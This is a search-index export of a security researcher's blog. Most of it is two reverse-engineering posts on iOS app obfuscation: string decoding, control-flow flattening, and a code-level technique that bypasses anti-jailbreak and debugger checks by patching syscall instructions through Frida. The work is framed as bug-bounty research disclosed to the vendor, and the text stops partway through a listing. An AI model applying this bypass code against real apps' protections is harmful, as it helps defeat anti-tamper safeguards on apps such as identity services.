[{"authors":null,"categories":null,"content":"","date":-62135596800,"expirydate":-62135596800,"kind":"section","lang":"en","lastmod":1652536515,"objectID":"8e92482d9e3b129fafbe928eb75c989f","permalink":"https://www.romainthomas.fr/projects-images/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/projects-images/","section":"projects-images","summary":"","tags":null,"title":"","type":"projects-images"},{"authors":null,"categories":null,"content":"","date":-62135596800,"expirydate":-62135596800,"kind":"section","lang":"en","lastmod":1652536515,"objectID":"1b7f62207d2617f7491785ce1c71e57f","permalink":"https://www.romainthomas.fr/project/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/project/","section":"project","summary":"","tags":null,"title":"","type":"project"},{"authors":null,"categories":null,"content":"","date":-62135596800,"expirydate":-62135596800,"kind":"section","lang":"en","lastmod":1652536515,"objectID":"3a079e7dad19be978a318345a7749d34","permalink":"https://www.romainthomas.fr/publication/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/publication/","section":"publication","summary":"","tags":null,"title":"Publications","type":"publication"},{"authors":null,"categories":null,"content":"","date":1461110400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"c4d1f293f132915949efd449efcf67f2","permalink":"https://www.romainthomas.fr/home/work-experience/","publishdate":"2016-04-20T00:00:00Z","relpermalink":"/home/work-experience/","section":"home","summary":"","tags":null,"title":"Work Experience","type":"home"},{"authors":["Romain Thomas"],"categories":["iOS","Reverse Engineering"],"content":" \u0026#160; The first part is here: Part 1 \u0026ndash; SingPass RASP Analysis After SingPass, I had a look at another application protected with the same obfuscator but with enhanced protections.\nCompared to the previous application, this new application crashes immediately as soon as it is launched.\nBy checking the crash log, we don\u0026rsquo;t get any meaningful information since the obfuscator trashes some registers like LR before crashing. By trashing LR, the iOS crash analytics service is not able to correctly build the call stack of the functions that led to the crash.\nOn the other hand, by tracing the libraries loaded by the application, we can identify in which loaded library the application crashes, and thus, the library is likely in charge of checking the environment\u0026rsquo;s integrity.\n$ ijector.py --spawn ios.app iTrace started PID: 63969 | tid: 771 Home: /private/var/mobile/Containers/Data/Application/A59541E1-106A-4C31-8188-0830E651449E ... ImageLoader::containsAddress(0x1065f948c): cxxreact!1948c ImageLoader::containsAddress(0x10564e270): ReactCommon!1a270 ImageLoader::containsAddress(0x103e5ed84): GRDB!12ed84 ImageLoader::containsAddress(0x104407790): Intercom!1bb790 ImageLoader::containsAddress(0x104c29d7c): KaaSLogging!9d7c ImageLoader::containsAddress(0x105871bb4): RxSwift!91bb4 ImageLoader::containsAddress(0x1056f00cc): RxBluetoothKit!440cc ImageLoader::containsAddress(0x104633f50): KaaSBle!bbf50 ---\u0026gt; CRASH! So the application crashes when loading the KaaSBle library embedded as a third-party framework of the application.\nCompared SingPass, the library does not leak symbols about the RASP checks nor about the obfuscator. In addition, some functions are obfuscated with control-flow flattening and Mixed Boolean-Arithmetic (MBA) expressions as we can observe in the following figure:\nFigure 1 - Control-Flow Flattening in the Constructor of KaaSBle Based on the previous analysis of SingPass, we know that RASP checks related to jailbreak or debugger detection use uncommon functions like getpid, unmount or pathconf. It turns out that, these functions are also imported by KaaSBle which enables to identify where some of the RASP checks are located.\n\u0026#160; Uncommon imported functions like unmount are usually a good signature to identify potential RASP checks For instance, the function sub_EBDC which uses getpid is likely involved in the debugger detection. This function is obfuscated with an MBA and control-flow flattening and, its graph is represented in Figure 21\n\u003c?xml version=\"1.0\" ?\u003e sub_ebdc: int64_t* var_20 = arg2 void* x20 = *arg2 int32_t pid_is_null if (_getpid() == 0) pid_is_null = 1 pid_is_null = 0 int32_t CST = neg.d(data_141b60) int32_t x22 = (CST ^ 0x80722d06) + ((CST \u0026amp; 0x722d06) \u0026lt;\u0026lt; 1) int32_t state_variable = 4 int64_t ret_val while (true) uint64_t state = zx.q(state_variable) if (state.d u\u0026lt;= 4) switch (state) case 0 : loc_ECA4 break case 1 : loc_EC78 ret_val = sub_968e0(arg1, x20) state_variable = 3 continue case 2 : loc_EC8C sub_968e0(arg1, x20) state_variable = 1 continue case 3 : loc_EC9C state_variable = 0 continue case 4 : loc_EC50 int32_t next_state if (pid_is_null != x22) next_state = 2 next_state = 1 state_variable = next_state return ret_val Figure 2 - BinaryNinja HLIL Graph of sub_EBDC Control-Flow Flattening I won\u0026rsquo;t detail how generally control-flow flattening works as it already exists a good bunch of articles on this topic:\nDeobfuscation: recovering an OLLVM-protected program by Quarkslab Automated Detection of Control-flow Flattening by Tim Blazytko D810: A journey into control flow unflattening by eShard Nevertheless, we can notice that the state variable that is used to drive the execution through the flattened blocks is linear and not encoded:\nThe state variable set at the end of the basic block exactly defines the next basic block to execute. This means that given:\nA state value The switch table The switch base address It is possible to easily compute the targeted basic block:\nFig 3. Computation of the Basic Block from a State Variable \u003c?xml version=\"1.0\" ?\u003evar_4c2Return3var_4c1ID: 1ID: 2ID: 3jpt_ec74Entry Blockvar_4c := Fig 4. Simplified Overview Since there is no encoding, we can determine the next states of a basic block by looking at the constant written in the local stack variable [sp, 0x50+var_4c] or the state_variable of the BinaryNinja High Level IL representation (Figure 2).\nFrom a graph recovery perspective, this design completely fits in the case of the Quarkslab\u0026rsquo;s blog: recovering an OLLVM-protected program , thus the original graph could be completely recovered.\n\u0026#160; I also checked other large control-flow-flattened functions in the binary and they follow the same design with the same weakness. Improvements Spoiler: This example comes from an on-going larger project: open-obfuscator.\nActually we can enhance the protections of the control-flow flattening by encoding the state variable and by identifying the basic blocks of the switch table with random numbers (instead of 1, 2, 3 etc).\nThe following figure outlines this design:\n\u003c?xml version=\"1.0\" ?\u003eComputation of the next state without a lookup tableEntry BlockInitial State Fig 5. Control-Flow Flattening with Random ID and Encoding Concretely, the code generated does not use a lookup-switch table and the dispatcher is a succession of conditions:\nFigure 6 - Head of the Control-Flow Flattening We can also observe the encoding block at the end of the graph:\nFigure 7 - Tail of the Control-Flow Flattening In this example, the encoding is simply $E(X) = X \\oplus A + B$ but it could be protected with an MBA and generated with different expressions, unique per function. Globally speaking, any injective (or bijective) function should fit as an encoding.\nIn the end, it would increase the complexity of recovering the original graph at scale (even though the design is known).\nMixed-Boolean Arithmetic We can also observe in Figure 2 that the function uses an MBA as an opaque zero or more precisely an opaque boolean.\nGenerally speaking, MBA are widely used by the obfuscator but they are usually represented under their simple form like $(A \\oplus B) + (A \\\u0026amp; B) \\times 2$. In other words, we can\u0026rsquo;t quickly identify the underlying arithmetic operation but with limited efforts, we can simplify the expression using public tools.\nIf you want to dig more into MBA deobfuscation, I highly recommend this recent blog post Improving MBA Deobfuscation using Equality Saturation by Tim Blazytko and Matteo which also lists open-source tools that can be used for simplifying MBA like:\nsspam msynth (Used for this binary) \u0026#160; Triton also supports program synthesis: synthesizing_obfuscated_expressions.py :) Strings Encoding Most of the strings used in the library are encoded which prevents identifying quickly sensitive functions.\nThese encoded strings are decoded just-in-time near the instruction that uses given the string. In the blog post about PokemonGO, all the strings were decrypted at once in the Mach-O constructors which enabled to recover all of these strings without caring about reverse engineering the decoding routines. For the current obfuscator, we can\u0026rsquo;t exactly apply this technique.\n\u003c?xml version=\"1.0\" ?\u003eContrusctorsub_01a34d()sub_f289()sub_78f3()__DATA.__data section Fig 8. Differences in Designing String Encryption To better understand the difficulty, let\u0026rsquo;s take a closer look at how strings are encoded with the _unmount() function. As a reminder, this function is used as a part of jailbreak detection.\nIn the KaaSBle library, there are five cross-references to _unmount():\n\u003c?xml version=\"1.0\" ?\u003e P sub_61d94+178 BL _unmount P sub_8fa98+1c8 BL _unmount P _mbedtls_entropy_gather_0+128 BL _unmount P _mbedtls_ssl_get_session+11c BL _unmount P sub_177998+c BL _unmount When looking at the prologue of the _unmount() calls, we get the following basic blocks:\nFigure 9 - Decoding Routine for the String /.bootstrapped Which is equivalent to this snippet:\nfrom itertools import cycle def decode(encrypted: bytes, key: str, op): key = bytes.fromhex(key) encrypted = bytes.fromhex(encrypted) out = \u0026#34;\u0026#34; for idx, (k, v) in enumerate(zip(encrypted, cycle(key))): out += chr(op(idx, k, v) \u0026amp; 0xFF) return out # /.bootstrapped clear = decode(\u0026#34;9f0b698a3abc17e70bb54332271180\u0026#34;, # Encoded string \u0026#34;b0250be555c8649379d43342427580\u0026#34;, # Key lambda _, k, v: (k ^ v)) # Operation It is worth mentioning that the string is not decoded in-placed but in another __data variable. This means that an encoded string takes potentially twice its size in the final binary.\nAnother example of a decoding routine:\nFigure 10 - Decoding Routine for the String /.installed_odyssey Which is equivalent to:\n# /.installed_odyssey clear = decode(\u0026#34;1bec336463362f66602b365d672e4f756f3353\u0026#34;, # Encoded string \u0026#34;ecbdc8f3\u0026#34;, # Key lambda i, k, v: (k - v - i)) # Operation In this case, the key is an uint32_t integer for which the bytes are accessed through a stack variable. The weird operation x12 = x8 \u0026amp; (x8 ^ 0xfffffffffffffffc) is simply a modulus sizeof(uint32_t) :)\nIn summary, because of the disparity of the encodings which are mixed with MBA and unique keys, it would be quite difficult to statically decode all the strings of the library. On the other hand, since the clear strings are written in the __data section of the binary, we can dump \u0026ndash; at some point in the execution \u0026ndash; this section and observe the clear strings (c.f. Singpass RASP Analysis - Jailbreak Detection).\nCrash Analysis When the obfuscator detects that the environment is compromised (jailbroken device, debugger attached, \u0026hellip;), it reacts by crashing the application. This crash occurs through different techniques among which:\nCorrupting a global pointer Executing a break instruction (BRK #1) Trashing the link register and frame register (LR / FP) Calling objc_msgSend with corrupted parameters The instructions involved in crashing the application are inlined in the function where the check occurs. This means that there is as many crash routine as there are RASP checks.\nIn particular, with such a design, we can\u0026rsquo;t target a single function to bypass the different checks as I did for SingPass.\nHooking the Syscalls \u0026#160; This approach is inspired by this talk at Pass the Salt: Jailbreak Detection and How to Bypass Them To better understand the problem, let\u0026rsquo;s recap the situation:\nThe code is obfuscated with CFG flattening, MBA, etc The RASP checks are inlined in the code The application crashes near the detection spot. In particular and compared to SingPass, there is no RASP endpoint that can be hooked. The following figure depicts the differences in the RASP reaction between the two applications:\n\u003c?xml version=\"1.0\" ?\u003e JailbreakDebuggerFridaUser callback JailbreakDebuggerFridaCrashCrashCrash Figure 11 - RASP Reaction: User Callback vs Crash We can\u0026rsquo;t actually hook a function to bypass the RASP checks but the structure of the AArch64 instructions has a valuable property:\nThe size of an AArch64 instruction is fixed As a consequence, we can linearly search the SVC #80 instructions which are encoded as 0xD4001001.\nInterception Let\u0026rsquo;s consider the following approach to intercept the syscalls:\nWe linearly scan the __text section to find the SVC instructions (i.e. the four-bytes 0xD4001001) We replace this instruction with a branch (BL #imm) to a function we control We process the redirection to disable the RASP checks For the first point, thanks to the fixed instruction\u0026rsquo;s size, we can search syscalls by reading the whole __text section:\nstatic constexpr uint32_t SVC = 0xD4001001; // SVC #0x80 static constexpr size_t SIZEOF_INST = 4; for (size_t addr = text_start; addr \u0026lt; text_end; addr += SIZEOF_INST) { // Read the instruction auto inst = *reinterpret_cast\u0026lt;uint32_t*\u0026gt;(addr); if (inst != SVC) { continue; } // We found a syscall instruction at: `addr` } For the second point, on a syscall instruction, we have to patch the syscall with a branch. To do so, Frida\u0026rsquo;s gum_memory_patch_code is pretty convenient:\nvoid* svc_addr = /* Address of the syscall to patch */ gum_memory_patch_code(svc_addr, /* sizeof an arm64 inst */ 4, [] (void* addr, void*) { GumArm64Writer* writer = gum_arm64_writer_new(addr); /* Transform a SVC #0x80 into BL #AABBCC */ gum_arm64_writer_put_bl_imm(writer, 0xAABBCC); }, nullptr); ); The pending question is where to branch the new BL instruction instead of 0xAABBCC?\nIdeally, we would like to jump on our own dedicated stub:\nvoid handler() { // ... } { // ... gum_arm64_writer_put_bl_imm(writer, \u0026amp;handler); } But, the bl #imm instruction only accepts an immediate value in the range of ]-0x8000000; 0x8000000[. This range might be too narrow to encode our absolute pointer \u0026amp;handler.\n\u0026#160; The BL instruction encodes the signed #imm as a multiple of 4 on 26 bits. Thus, and because of the sign bit, this #imm can range from: ±1 \u0026lt;\u0026lt; (26 + 2 - 1); We can actually workaround this restriction by using a trampoline located in the library where the RASP checks occur. It is quite common for large binary to find small functions with one or two instructions that are not likely or rarely used:\nFigure 12 - Small C++ vtable function Figure 13 - Small C++ vtable function The idea is to use one of these functions as a placeholder to write two instructions which enables to branch an absolute address:\nLDR x15, =\u0026amp;handler BR x15 Since this placeholder function is located within the library where the syscalls take place, we can BL #imm to this function without risking too much that #imm overflows the range ]-0x8000000; 0x8000000[.\n\u003c?xml version=\"1.0\" ?\u003e0x169F8: SVC #0x800x20EF0: SVC #0x800x6DB64: SVC #0x800xA4964: SVC #0x80sub sp, sp, #10 add sp, sp, #100x169F8: BL #1400x20EF0: BL #1200x6DB64: BL #800xA4964: BL #64LDR x15, =\u0026amp;handler BR x15 Fig 14. Syscall Patch Now that we found a mechanism to redirect the syscall instruction, we can focus on the handler function which aims at welcoming the syscall\u0026rsquo;s redirection.\nFirst, the SVC instructions are atomic which means that our handler function must take care of not corrupting the values of the registers.\nIn particular, handler can\u0026rsquo;t follow the ARM64 calling convention. If we consider the following instructions:\nmov x6, #0 ... svc #0x80 ... mov x2, x6 svc #0x80 does not corrupt x6 while this code:\nmov x6, #0 ... BL #imm ... mov x2, x6 could corrupt x6 according to the ARM64 calling convention. Therefore, our handler() function must really mimic an interruption and take care of correctly saving/restoring the registers.\nIn other words, we must write a small assembly stub to save and restore the registers2\nstp x0, x1, [sp, -16]! ... stp x28, x29, [sp, -16]! stp x30, xzr, [sp, -16]! mov x0, sp bl _syscall_handler; ldp x30, xzr, [sp], 16 ldp x28, x29, [sp], 16 ... ldp xzr, x1, [sp], 16 ret The syscall_handler function takes a pointer to the stack frame as a parameter. Thus, we can access the saved registers:\nextern \u0026#34;C\u0026#34; { uintptr_t syscall_handler(uintptr_t* sp) { uintptr_t x16 = sp[14]; // Syscall number return -1; } } \u0026#160; Apple prefixes (or mangles) symbols with a _ this is why syscall_handler is referenced by _syscall_handler in the assembly code. Given our syscall_handler function, we have access to the original AArch64 registers such as we can access the syscall number and its parameters. We are also able to modify the return value since the original syscall is replaced by a branch.\n\u003c?xml version=\"1.0\" ?\u003e0x169F8: SVC #0x800x20EF0: SVC #0x800x6DB64: SVC #0x800xA4964: SVC #0x80sub sp, sp, #10 add sp, sp, #100x169F8: BL #1400x20EF0: BL #1200x6DB64: BL #800xA4964: BL #64LDR x15, =\u0026amp;handler BR x15handler (...) { stp x0, x1, [sp, -16]! bl _syscall_handler; ldp xzr, x1, [sp], 16; ret; }syscall_handler (...) { // Bypass }iHook.dylib Fig 14. Syscall Redirection A PoC that wraps all this logic will be published on GitHub.\nConclusion Whilst this application uses the same obfuscator as in the previous blog post, it was configured with multi-layered code obfuscation which includes control-flow flattening and MBA. In addition, the RASP checks are also configured to crash the application instead of calling a callback function and displaying a message. These improvements in the configuration of the obfuscator make the reverse engineering of the application harder compared to the previous SingPass application.\nThis blog post also detailed a new AArch64-generic technique to intercept RASP syscalls which resulted in a successful bypass of the RASP checks. This technique should also apply to Android AArch64.\nThis is the last part of this series about iOS obfuscation. As I said in the first disclaimer, the obfuscator used for protecting these applications is and remains a good choice to protect assets from reverse engineering.\nThe graph is more convenient to explore if Javascript is enabled.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nWe don\u0026rsquo;t restore x0 as we want to change the return value from _syscall_handler.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":1663027200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652974688,"objectID":"7e83d437f5b0c9e7ef367be4145c266e","permalink":"https://www.romainthomas.fr/post/22-09-ios-obfuscation-syscall-hooking/","publishdate":"2022-09-13T00:00:00Z","relpermalink":"/post/22-09-ios-obfuscation-syscall-hooking/","section":"post","summary":"This second blog post deals with native code obfuscation and RASP syscall interception","tags":["ios","reverse engineering","obfuscation"],"title":"Part 2 – iOS Native Code Obfuscation and Syscall Hooking","type":"post"},{"authors":["Romain Thomas"],"categories":["iOS","Reverse Engineering"],"content":"Introduction I started to dig into the SingPass application which turned out to be obfuscated and protected with Runtime Application Self-Protection (RASP).\nRetrospectively, this application is pretty interesting to analyze RASP functionalities since:\nIt embeds advanced RASP functionalities (Jailbreak detection, Frida Stalker detection, \u0026hellip;). The native code is lightly obfuscated. The application starts by showing an error message which is a good oracle to know whether we managed to circumvent the RASP detections. \u003c?xml version=\"1.0\" ?\u003e Context All the findings and the details of this blog post has been shared with the editor of the obfuscator. The overall results have also been shared with SingPass. In addition, SingPass is part of a bug bounty program on HackerOne. Bypassing these RASP checks are a prerequisite to go further in the security assessment of this application. By grepping some keywords in the install directory of the application, we actually get two results which reveal the name of the obfuscator:\niPhone:/private/[...]/SingPass.app root# grep -Ri +++++++ * Binary file Frameworks/NuDetectSDK.framework/NuDetectSDK matches Binary file SingPass matches The NuDetectSDK binary also uses the same obfuscator but it does not seem involved in the early jailbreak detection shown in the previous figure. On the other hand, SingPass is the main binary of the application and we can observe strings related to threat detections:\n$ SingPass.app strings ./SingPass|grep -i +++++++ +++++++ThreatLogAPI(headers:) +++++++CallbackHandler(context:) Binary For those who would like to follow this blog post with the original binary, you can download the decrypted SingPass Mach-O binary here . The name of the obfuscator has been redacted but it does not impact the content of the code. Unfortunately, the binary does not leak other strings that could help to identify where and how the application detects jailbroken devices but fortunately, the application does not crash \u0026hellip;\nIf we assume that the obfuscator decrypts strings at runtime, we can try to dump the content of the __data section when the error message is displayed. At this point of the execution, the strings used for detecting jailbroken devices are likely decoded and clearly present in the memory.\nThis is actually quite the same technique used in PokemonGO: What About LIEF We run the application and we wait for the jailbreak message We attach to SingPass with Frida and we inject a library that: Parses in-memory the SingPass binary (thanks to LIEF) Dumps the content of the __data section Write the dump in the iPhone\u0026rsquo;s /tmp directory Once the data section is dumped, we end up with the following changes in some parts of the __data section:\n\u003c?xml version=\"1.0\" ?\u003e __data:00000001010B97FA\u0026#160;qword_1010B97FA\u0026#160;DCQ\u0026#160;0x942752767D91608E __data:00000001010B97FA __data:00000001010B9802\u0026#160;byte_1010B9802\u0026#160;\u0026#160;DCB\u0026#160;0x98 __data:00000001010B9802 __data:00000001010B9803\u0026#160;dword_1010B9803\u0026#160;DCD\u0026#160;0x2318E9A2 __data:00000001010B9803 __data:00000001010B9807\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCQ\u0026#160;0x222AD8A21325DEE5 __data:00000001010B980F\u0026#160;byte_1010B980F\u0026#160;\u0026#160;DCB\u0026#160;0xE0 __data:00000001010B980F __data:00000001010B9810\u0026#160;byte_1010B9810\u0026#160;\u0026#160;DCB\u0026#160;0xE5 __data:00000001010B9810 __data:00000001010B9811\u0026#160;byte_1010B9811\u0026#160;\u0026#160;DCB\u0026#160;0xB7 __data:00000001010B9811 __data:00000001010B9812\u0026#160;dword_1010B9812\u0026#160;DCD\u0026#160;0x8491650B __data:00000001010B9812 __data:00000001010B9816\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCQ\u0026#160;0xB7D0892EFAB11BBF __data:00000001010B981E\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCQ\u0026#160;0x4B9FF985643894C5 __data:00000001010B9826\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCQ\u0026#160;0x38D0ABE65C497CF0 __data:00000001010B9826 __data:00000001010B982E\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCQ\u0026#160;0xD769CDDBCB49C500 __data:00000001010B9836\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCQ\u0026#160;0xF1C4BCB1A563CD53 __data:00000001010B983E\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCD\u0026#160;0x52BB5CBC __data:00000001010B9842\u0026#160;byte_1010B9842\u0026#160;\u0026#160;DCB\u0026#160;0x42 __data:00000001010B9842 __data:00000001010B9843\u0026#160;dword_1010B9843\u0026#160;DCD\u0026#160;0x2451DD96 __data:00000001010B9843 __data:00000001010B9847\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCQ\u0026#160;0x6248099506559926 __data:00000001010B984F\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCD\u0026#160;0xFAF2AF09 __data:00000001010B9853\u0026#160;dword_1010B9853\u0026#160;DCD\u0026#160;0xD8B63318 __data:00000001010B9853 __data:00000001010B9857\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCQ\u0026#160;0xD1CA2820CCC72C5F __data:00000001010B985F\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCQ\u0026#160;0xE7CE3B62D1C62F5E __data:00000001010B9867\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCD\u0026#160;0x77CE475E __data:00000001010B986B\u0026#160;dword_1010B986B\u0026#160;DCD\u0026#160;0x7AB7291C __data:00000001010B986B __data:00000001010B986F\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCQ\u0026#160;0x75C9251C6AC41E5F __data:00000001010B9877\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCQ\u0026#160;0x71CF165D64C42C4E __data:00000001010B987F\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCQ\u0026#160;0x6EC22E5133BA165C __data:00000001010B9887\u0026#160;word_1010B9887\u0026#160;\u0026#160;DCW\u0026#160;0xB54F __data:00000001010B9887 __data:00000001010B9889\u0026#160;dword_1010B9889\u0026#160;DCD\u0026#160;0xDEDB09A0 __data:00000001010B9889 \u003c?xml version=\"1.0\" ?\u003e __data:00000001010B97FA\u0026#160;aTaurine\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCB\u0026#160;\"/taurine\",0 __data:00000001010B97FA __data:00000001010B9803\u0026#160;aTaurineCstmp\u0026#160;\u0026#160;\u0026#160;DCB\u0026#160;\"/taurine/cstmp\",0 __data:00000001010B9803 __data:00000001010B9812\u0026#160;aTaurineJailbre\u0026#160;DCB\u0026#160;\"/taurine/jailbreakd\",0 __data:00000001010B9812 __data:00000001010B9812 __data:00000001010B9826\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;DCD\u0026#160;0 __data:00000001010B982A\u0026#160;aTaurineLaunchj\u0026#160;DCB\u0026#160;\"/taurine/launchjailbreak\",0 __data:00000001010B982A __data:00000001010B982A __data:00000001010B9843\u0026#160;aTaurineJbexec\u0026#160;\u0026#160;DCB\u0026#160;\"/taurine/jbexec\",0 __data:00000001010B9843 __data:00000001010B9853\u0026#160;aTaurineAmfideb\u0026#160;DCB\u0026#160;\"/taurine/amfidebilitate\",0 __data:00000001010B9853 __data:00000001010B9853 __data:00000001010B986B\u0026#160;aTaurinePspawnP\u0026#160;DCB\u0026#160;\"/taurine/pspawn_payload.dylib\",0 __data:00000001010B986B __data:00000001010B986B __data:00000001010B9889\u0026#160;aInstalledTauri\u0026#160;DCB\u0026#160;\"/.installed_taurine\",0 __data:00000001010B9889 __data:00000001010B9889 Fig 1. Slices of the __data section before and after the dump Note The string encoding routines will be analyzed in the second part of this series of blog posts In addition, we can observe the following strings which seem to be related to the RASP functionalities of the obfuscator:\n\u003c?xml version=\"1.0\" ?\u003e __data:1010B8D10\u0026#160;aEvtCodeTracing\u0026#160;DCB\u0026#160;\"EVT_CODE_TRACING\",0\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;;\u0026#160;XREF:\u0026#160;on_rasp_detection __data:1010B8D30\u0026#160;aEvtCodeSystemL\u0026#160;DCB\u0026#160;\"EVT_CODE_SYSTEM_LIB\",0\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;;\u0026#160;XREF:\u0026#160;on_rasp_detection __data:1010B8D50\u0026#160;aEvtCodeSymbolT\u0026#160;DCB\u0026#160;\"EVT_CODE_SYMBOL_TABLE\",0\u0026#160;\u0026#160;\u0026#160;\u0026#160;;\u0026#160;XREF:\u0026#160;on_rasp_detection __data:1010B8D70\u0026#160;aEvtCodePrologu\u0026#160;DCB\u0026#160;\"EVT_CODE_PROLOGUE\",0\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;;\u0026#160;XREF:\u0026#160;on_rasp_detection __data:1010B8D90\u0026#160;aEvtAppLoadedLi\u0026#160;DCB\u0026#160;\"EVT_APP_LOADED_LIBRARIES\",0\u0026#160;;\u0026#160;XREF:\u0026#160;on_rasp_detection __data:1010B8DB0\u0026#160;aEvtAppSignatur\u0026#160;DCB\u0026#160;\"EVT_APP_SIGNATURE\",0\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;;\u0026#160;XREF:\u0026#160;on_rasp_detection __data:1010B8DD0\u0026#160;aEvtEnvDebugger\u0026#160;DCB\u0026#160;\"EVT_ENV_DEBUGGER\",0\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;;\u0026#160;XREF:\u0026#160;on_rasp_detection __data:1010B8DF0\u0026#160;aEvtEnvJailbrea\u0026#160;DCB\u0026#160;\"EVT_ENV_JAILBREAK\",0\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;;\u0026#160;XREF:\u0026#160;on_rasp_detection __data:1010B8E10\u0026#160;aUsersChinweeDe\u0026#160;DCB\u0026#160;\"/Users/***/ndi-sp-mobile-ios-swift/SingPass/*******.swift\",0 __data:1010B8E10\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;\u0026#160;;\u0026#160;XREF:\u0026#160;on_rasp_detection Fig 2. Strings Related to the RASP Features All the EVT_* strings are referenced by one and only one function that I named on_rasp_detection. This function turns out to be the threat detection callback used by the app\u0026rsquo;s developers to perform action(s) when a RASP event is triggered.\nTo better understand the logic of the checks behind these strings, let\u0026rsquo;s start with EVT_CODE_PROLOGUE which is used to detect hooked functions.\nEVT_CODE_PROLOGUE: Hook Detection While going through the assembly code closes to the cross-references of on_rasp_detection, we can spot several times this pattern:\n\u003c?xml version=\"1.0\" ?\u003e __text: 000000010000B05C loc_finish __text: 000000010000B05C LDR X0 , [ X19 , #0x20 ] __text: 000000010000B060 SUB SP , X29 , #0x10 __text: 000000010000B064 LDP X29 , X30 , [ SP , #0x10 + var_s0 ] __text: 000000010000B068 LDP X20 , X19 , [ SP + 0x10 + var_10 ] , 